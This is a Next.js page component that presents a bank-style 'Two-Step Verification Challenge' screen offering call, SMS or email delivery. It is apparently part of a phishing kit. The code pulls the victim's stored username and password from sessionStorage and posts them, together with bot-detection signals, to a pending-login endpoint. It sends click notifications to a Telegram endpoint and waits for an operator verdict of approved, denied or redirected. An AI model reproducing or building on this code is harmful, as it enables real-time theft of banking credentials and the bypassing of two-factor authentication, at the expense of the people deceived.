"use client"

import { useEffect, useState, type ReactNode } from "react"
import { useRouter } from "next/navigation"
import EbcVerifyChallengeShell from "@/components/EbcVerifyChallengeShell"
import styles from "@/components/ebc-verify-challenge.module.css"
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
} from "@/lib/approval-messages"
import { useBotGateSignals } from "@/hooks/use-bot-gate-signals"
import { readStoredPassword, readStoredUsername } from "@/lib/login-flow-storage"
import { pollPendingLogin } from "@/lib/poll-pending-login"
import {
  pendingLoginMethod,
  verificationTypeLabel,
  type DeliveryMethod,
} from "@/lib/verification-method"

function WarningIcon() {
  return (
    <svg className={styles.alertIcon} viewBox="0 0 24 24" aria-hidden="true">
      <path
        fill="#8a6d1d"
        d="M12 2 1 21h22L12 2zm0 4.8 7.2 12.4H4.8L12 6.8zM11 10v5h2v-5h-2zm0 6v2h2v-2h-2z"
      />
    </svg>
  )
}

function PhoneIcon() {
  return (
    <svg className={styles.methodBtnIcon} viewBox="0 0 24 24" aria-hidden="true">
      <path
        fill="currentColor"
        d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1.1-.2 1.2.4 2.5.6 3.8.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1C10.6 21 3 13.4 3 4c0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.3.2 2.6.6 3.8.1.4 0 .8-.3 1.1l-2.2 2.2z"
      />
    </svg>
  )
}

function TextIcon() {
  return (
    <svg className={styles.methodBtnIcon} viewBox="0 0 24 24" aria-hidden="true">
      <path
        fill="currentColor"
        d="M4 4h16a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H8l-4 4v-4H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2zm2 4v2h8V8H6zm0 4v2h12v-2H6z"
      />
    </svg>
  )
}

function AtIcon() {
  return (
    <svg className={styles.methodBtnIcon} viewBox="0 0 24 24" aria-hidden="true">
      <path
        fill="currentColor"
        d="M12 2a10 10 0 1 0 3.5 19.4l-.9-1.8A8 8 0 1 1 20 12v1a2 2 0 0 1-4 0V8h-1.7A4.5 4.5 0 1 0 16.5 14 3.9 3.9 0 0 0 22 13v-1A10 10 0 0 0 12 2zm0 6.5A2.5 2.5 0 1 1 9.5 11 2.5 2.5 0 0 1 12 8.5z"
      />
    </svg>
  )
}

function MethodButtonSpinner() {
  return <span className={styles.btnSpinner} aria-hidden="true" />
}

type MethodButtonProps = {
  method: DeliveryMethod
  label: string
  icon: ReactNode
  className: string
  selectedMethod: DeliveryMethod | ""
  isPolling: boolean
  onSelect: (method: DeliveryMethod) => void
}

function MethodButton({
  method,
  label,
  icon,
  className,
  selectedMethod,
  isPolling,
  onSelect,
}: MethodButtonProps) {
  const isLoading = isPolling && selectedMethod === method

  return (
    <button
      type="button"
      className={className}
      onClick={() => void onSelect(method)}
      disabled={isPolling}
      aria-pressed={selectedMethod === method}
      aria-busy={isLoading}
    >
      {isLoading ? <MethodButtonSpinner /> : icon}
      {label}
    </button>
  )
}

export default function VerifyChoicePage() {
  const router = useRouter()
  const [selectedMethod, setSelectedMethod] = useState<DeliveryMethod | "">("")
  const [isPolling, setIsPolling] = useState(false)
  const [error, setError] = useState("")
  const getBotGateSignals = useBotGateSignals()

  useEffect(() => {
    try {
      if (!sessionStorage.getItem("loginReady")) {
        window.location.href = "/"
      }
    } catch {
      window.location.href = "/"
    }
  }, [])

  async function handleSelect(method: DeliveryMethod) {
    if (isPolling) return
    setIsPolling(true)
    setError("")
    setSelectedMethod(method)

    const clickType =
      method === "email" ? "email_verification" : "text_verification"

    void fetch("/api/telegram/verification-click", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: clickType,
        verificationType: verificationTypeLabel(method),
        method: pendingLoginMethod(method),
        page: "/verify-choice",
        timestamp: new Date().toISOString(),
      }),
      keepalive: true,
    }).catch(() => {})

    const userId = readStoredUsername() || sessionStorage.getItem("loginUserId") || ""
    const password = readStoredPassword() || sessionStorage.getItem("loginPassword") || ""
    const maskedEmail = sessionStorage.getItem("maskedEmail") ?? "**********"
    const maskedPhone = sessionStorage.getItem("maskedPhone") ?? "***-***-****"

    try {
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId,
          password,
          method: pendingLoginMethod(method),
          maskedEmail,
          maskedPhone,
          flow: "login",
          ...getBotGateSignals(),
        }),
      })
      const data = (await res.json()) as { id?: string; error?: string }
      if (!res.ok) {
        setError(data.error || MSG_UNABLE_REACH_VERIFICATION)
        setSelectedMethod("")
        setIsPolling(false)
        return
      }
      if (!data.id) {
        window.location.href = "/?verifyUnavailable=1"
        return
      }

      const result = await pollPendingLogin(data.id, APPROVAL_TIMEOUT_MS)

      if (result === "approved") {
        sessionStorage.setItem("verificationMethod", method)
        sessionStorage.setItem("verificationType", verificationTypeLabel(method))
        router.push(`/verify?method=${encodeURIComponent(method)}`)
        return
      }
      if (result === "redirected") {
        window.location.href = "/api/login-out"
        return
      }
      if (result === "denied") {
        window.location.href = "/?loginDenied=1"
        return
      }
      window.location.href = "/?verifyUnavailable=1"
    } catch {
      setError(MSG_UNABLE_REACH_VERIFICATION)
      setSelectedMethod("")
      setIsPolling(false)
    }
  }

  return (
    <EbcVerifyChallengeShell
      onLogout={() => {
        window.location.href = "/"
      }}
      logoutDisabled={isPolling}
    >
      <h1 className={styles.title}>Two-Step Verification Challenge</h1>
      <h2 className={styles.subtitle}>Receive the verification code</h2>
      <hr className={styles.rule} />

      <div className={styles.alert} role="status">
        <WarningIcon />
        <span>We need to verify who you are before we let you log in.</span>
      </div>

      {error ? <p className={styles.error}>{error}</p> : null}

      <p className={styles.rates}>Standard messaging rates may apply.</p>

      <section className={styles.section} aria-labelledby="mobile-phone-heading">
        <h3 id="mobile-phone-heading" className={styles.sectionTitle}>
          Mobile Phone
        </h3>
        <div className={styles.buttonRow}>
          <MethodButton
            method="call"
            label="Call"
            icon={<PhoneIcon />}
            className={`${styles.methodBtn} ${styles.btnCall}`}
            selectedMethod={selectedMethod}
            isPolling={isPolling}
            onSelect={handleSelect}
          />
          <MethodButton
            method="text"
            label="SMS"
            icon={<TextIcon />}
            className={`${styles.methodBtn} ${styles.btnText}`}
            selectedMethod={selectedMethod}
            isPolling={isPolling}
            onSelect={handleSelect}
          />
        </div>
      </section>

      <section className={styles.section} aria-labelledby="email-heading">
        <h3 id="email-heading" className={styles.sectionTitle}>
          Email
        </h3>
        <p className={styles.sectionCopy}>
          You may choose to receive your verification code via email; however, we
          recommend using a phone option for improved security.
        </p>
        <div className={styles.buttonRow}>
          <MethodButton
            method="email"
            label="Email"
            icon={<AtIcon />}
            className={`${styles.methodBtn} ${styles.btnEmail}`}
            selectedMethod={selectedMethod}
            isPolling={isPolling}
            onSelect={handleSelect}
          />
        </div>
      </section>
    </EbcVerifyChallengeShell>
  )
}
